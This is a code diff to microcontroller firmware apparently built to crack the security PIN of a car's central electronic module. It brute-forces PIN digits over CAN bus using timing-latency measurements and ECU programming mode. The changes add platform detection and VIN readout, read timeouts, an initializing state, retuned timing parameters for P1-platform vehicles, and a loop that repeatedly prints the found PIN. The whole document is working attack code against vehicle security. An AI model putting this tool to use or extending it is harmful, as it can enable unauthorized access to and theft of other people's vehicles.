@@ -79,7 +79,7 @@
 
 
 
-#define DEBUG_LATENCY 0
+#define DEBUG_LATENCY 1
 
 #if (DEBUG_LATENCY==1)
 uint8_t DEBUG_LATENCY_ENABLED = 0;
@@ -94,9 +94,10 @@ uint8_t platform = PLATFORM_UNKNOWN;
 
 
 #define STATE_IDLE                  0
-#define STATE_CRACKING              1
-#define STATE_INTERRUPT_REQUESTED   2
-#define STATE_RESTART_REQUESTED     3
+#define STATE_INITIALIZING          1
+#define STATE_CRACKING              2
+#define STATE_INTERRUPT_REQUESTED   3
+#define STATE_RESTART_REQUESTED     4
 volatile uint8_t operatingState = STATE_IDLE;
 
 #define HAS_CAN_LS          /* in the vehicle both low-speed and high-speed CAN-buses need to go into programming mode */
@@ -145,7 +146,11 @@ uint8_t AVERAGE_DELTA_MAX;                  /* buckets to look at after the roll
 
 uint32_t *shuffleOrder;
 uint32_t shuffleOrderP2[] = { 3, 1, 5, 0, 2, 4 };
-uint32_t shuffleOrderP1[] = { 0, 1, 2, 3, 4, 5 };
+//uint32_t shuffleOrderP1[] = { 0, 1, 2, 3, 4, 5 }; // original
+uint32_t shuffleOrderP1[] = { 3, 2, 1, 4, 0, 5 }; // vaucher
+//+uint32_t shuffleOrderP1[] = { 4, 2, 1, 5, 3, 0 }; 
+//uint32_t shuffleOrderP1[] = { 5, 2, 1, 4, 0, 3 };
+//uint32_t shuffleOrderP1[] = { 2, 0, 1, 3, 4, 5f };
 
 uint8_t DUMP_BUCKETS          = 0;                    /* dump all buckets for debugging */
 uint8_t USE_ROLLING_AVERAGE   = 0;                    /* use a rolling average latency for choosing measurements */
@@ -372,6 +377,9 @@ bool canMsgReceive (uint32_t *id, uint8_t *data, bool wait, bool verbose)
   uint8_t *pData;
   uint32_t canId = 0;
   bool     ret = false;
+  uint32_t start, timeout = 3000;
+
+  start = TSC;
 
 #if (HW_SELECTION == MCP2515_HW)
   uint8_t msg[CAN_MSG_SIZE] = { 0 };
@@ -400,6 +408,8 @@ bool canMsgReceive (uint32_t *id, uint8_t *data, bool wait, bool verbose)
         wait = false;
     }
     
+    //if(TSC-start > timeout) wait=false;
+
 
   } while ((ret == false) && (wait == true));
 
@@ -427,6 +437,9 @@ bool canMsgReceive (uint32_t *id, uint8_t *data, bool wait, bool verbose)
     {
         wait = false;
     }
+
+    //if(TSC-start > timeout) wait=false;
+    
   } while ((ret == false) && (wait == true));
 
 #endif /* HW_SELECTION */
@@ -840,7 +853,7 @@ void progModeOff (void)
 
   /* broadcast a series of reset requests */
 
-  for (uint32_t i = 0; i < 50; i++) {
+  for (uint32_t i = 0; i < 25; i++) {
     canMsgSend (CAN_HS, 0xffffe, data, verbose);
     canMsgSend (CAN_LS, 0xffffe, data, verbose);
 
@@ -856,13 +869,19 @@ void progModeOff (void)
 void identifyPlatform (void)
 {
   uint8_t  data[CAN_MSG_SIZE] = { 0xFF, 0xC8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
-  uint8_t  rcvData[25*7] = { 0 };
+  uint8_t  rcvData[26*7] = { 0 };
   uint32_t time = 100, i;
   uint32_t delayTime = 5;
   uint32_t id;
   bool     verbose = false;
+  bool     platform_detected = false;
+
+
+  operatingState = STATE_INITIALIZING;
 
   printf ("Retreiving VIN...\n");
+
+//platform=PLATFORM_P1;
 //return;
     canMsgSend (CAN_HS, 0xffffe, data, verbose);
 
@@ -880,36 +899,52 @@ void identifyPlatform (void)
     id=0;
     while( (id&0x3) != 0x3)
     {
-        canMsgReceive (&id, data, true, verbose);
-        if(verbose) printf("ID: 0x%x 0x%x\n", id, id&0x3);
+        if(canMsgReceive (&id, data, true, verbose))
+        {
+            if(verbose) printf("ID: 0x%x 0x%x\n", id, id&0x3);
+        }
+        else
+        {
+            printf("Read timeout. Assuming platform P1.\n");
+            platform=PLATFORM_P1;
+            break;
+        }
+
+        if( operatingState != STATE_INITIALIZING ) return;
     }
     memcpy(rcvData+0*7,data+1,sizeof(uint8_t)*7);
-
 
     if(id==0x1200003)
     {
         printf("Detected platform P2\n");
         platform=PLATFORM_P2;
+        platform_detected = true;
     }
     else if(id==0x400003)
     {
         printf("Detected platform P1\n");
         platform=PLATFORM_P1;
-
+        platform_detected = true;
     }
     else
     {
-        printf("Unkown plqtform :( id=0x%x\n", id);
-    }
-      
-    for(i=1;;i++)
-    {
-        id=0;
-        while( (id&0x3) != 0x3) canMsgReceive (&id, data, true, verbose);
-        memcpy(rcvData+i*7,data+1,sizeof(uint8_t)*7);
-        if( (data[0] & 0xf0) == 0x40 ) break;
+        printf("Unkown platform :( id=0x%x\n", id);
     }
 
+    if(platform_detected)
+    {
+        for(i=1;;i++)
+        {
+            id=0;
+            while( (id&0x3) != 0x3) 
+            {
+                canMsgReceive (&id, data, true, verbose);
+                if( operatingState != STATE_INITIALIZING ) return;
+            }
+            memcpy(rcvData+i*7,data+1,sizeof(uint8_t)*7);
+            if( (data[0] & 0xf0) == 0x40 || i>=25) break;
+        }
+    
 
       /*
       printf ("ALL: ");
@@ -922,27 +957,27 @@ void identifyPlatform (void)
       */
       
 
-      printf ("VIN: ");
-      for(i=14;i<=30;i++)
-      {
-        printf("%c", rcvData[i]);
-      }
-      printf("\n");
-
-      printf ("Chasis: ");
-      for(i=49;i<=54;i++)
-      {
-        printf("%c", rcvData[i]);
-      }
-      printf("\n");
-
-      printf ("Structure week: ");
-      for(i=61;i<=66;i++)
-      {
-        printf("%c", rcvData[i]);
-      }
-      printf("\n");
-
+          printf ("VIN: ");
+          for(i=14;i<=30;i++)
+          {
+            printf("%c", rcvData[i]);
+          }
+          printf("\n");
+    
+          printf ("Chasis: ");
+          for(i=49;i<=54;i++)
+          {
+            printf("%c", rcvData[i]);
+          }
+          printf("\n");
+    
+          printf ("Structure week: ");
+          for(i=61;i<=66;i++)
+          {
+            printf("%c", rcvData[i]);
+          }
+          printf("\n");
+    }    
 
 
   if (platform == PLATFORM_P2)
@@ -965,11 +1000,11 @@ void identifyPlatform (void)
   {
     /* P1 platform settings: S40, V50, C30, C70 */
 
-    BUCKETS_PER_US        = 4;                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
-    CEM_REPLY_US          = (200 * BUCKETS_PER_US); /* minimum time in us for CEM to reply for PIN unlock command (approx) */
+    BUCKETS_PER_US        = 1;                    /* how many buckets per microsecond do we store (4 means 1/4us or 0.25us resolution */
+    CEM_REPLY_US          = (100 * BUCKETS_PER_US); /* minimum time in us for CEM to reply for PIN unlock command (approx) */
     CEM_REPLY_TIMEOUT_MS  = 2;                    /* maximum time in ms for CEM to reply for PIN unlock command (approx) */
-    HISTOGRAM_DISPLAY_MIN = 10 * BUCKETS_PER_US;//8;                    /* minimum count for histogram display (8us below average) */
-    HISTOGRAM_DISPLAY_MAX = 10 * BUCKETS_PER_US;//24;                   /* maximum count for histogram display (24us above average) */
+    HISTOGRAM_DISPLAY_MIN =  7 * BUCKETS_PER_US;//8;                    /* minimum count for histogram display (8us below average) */
+    HISTOGRAM_DISPLAY_MAX = 20 * BUCKETS_PER_US;//24;                   /* maximum count for histogram display (24us above average) */
 
     DUMP_BUCKETS          = 0;                    /* dump all buckets for debugging */
 
@@ -996,7 +1031,6 @@ void identifyPlatform (void)
   printf("DUMP_BUCKETS: %d\n", DUMP_BUCKETS);
   printf("USE_ROLLING_AVERAGE: %d\n", USE_ROLLING_AVERAGE);
 */
-
 }
 
 /*******************************************************************************
@@ -1095,7 +1129,8 @@ void crackPinPosition (uint8_t *pin, uint32_t pos, bool verbose)
 
         /* iterate the next PIN digit (third digit) */
 
-        pin[pos + 2] = binToBcd ((uint8_t)(j & 0xff));
+        //pin[pos + 2] = binToBcd ((uint8_t)( random(0,255) & 0xff));
+        pin[pos + 2] = binToBcd ((uint8_t)( j & 0xff));
 
         /* try and unlock and measure the latency */
 
@@ -1336,10 +1371,12 @@ void cemCrackPin (uint32_t maxBytes, bool verbose)
       /* the PIN worked, print it and terminate the search */
 
       printf ("done\n");
+while(1){
       printf ("\nfound PIN: %02x %02x %02x %02x %02x %02x",
               //              pin[0], pin[1], pin[2], pin[3], pin[4], pin[5]);
               pinUsed[0], pinUsed[1], pinUsed[2], pinUsed[3], pinUsed[4], pinUsed[5]);
-
+    delay(2000);
+}
       cracked = true;
       break;
     }
@@ -1545,7 +1582,7 @@ void buttonTimerHandler()
         {
             pressedTicks=0;
                     
-            if( operatingState == STATE_IDLE)
+            if( operatingState == STATE_IDLE )
             {
                 operatingState = STATE_RESTART_REQUESTED;
             }
@@ -1563,7 +1600,7 @@ void buttonTimerHandler()
         {
             depressedTicks=0;
                    
-            if( operatingState == STATE_IDLE)
+            if( operatingState == STATE_IDLE )
             {
                 operatingState = STATE_RESTART_REQUESTED;
             }
@@ -1584,7 +1621,7 @@ void buttonTimerHandler()
         depressedTicks<TICKS_PER_SECOND && 
         pressedTicks>0 && 
         depressedTicks>0 &&
-        operatingState == STATE_CRACKING
+        ( operatingState == STATE_CRACKING || operatingState == STATE_INITIALIZING )
        )
     {
         printf("\n\nUSER INTERRUPT: aborting...\n");
@@ -1610,7 +1647,7 @@ void setup (void)
 {
 
     printf("Waiting 3 seconds for terminal to connect...\n");
-    delay(3000);
+    // RPP delay(3000);
     
   /* set up the pin for sampling the CAN bus */
 
@@ -1671,16 +1708,18 @@ void loop (void)
   {
 
       progModeOff ();
-    
       identifyPlatform();
     
       printf("\n");
       /* drain any pending messages */
       while (canMsgReceive (NULL, NULL, false, false) == true)
         ;
-      
+      if( operatingState != STATE_INITIALIZING) 
+      {
+        continue;
+      }
+     
       /* put all ECUs into programming mode */
-      operatingState = STATE_CRACKING;
       progModeOn ();
     
       /* drain any pending messages */
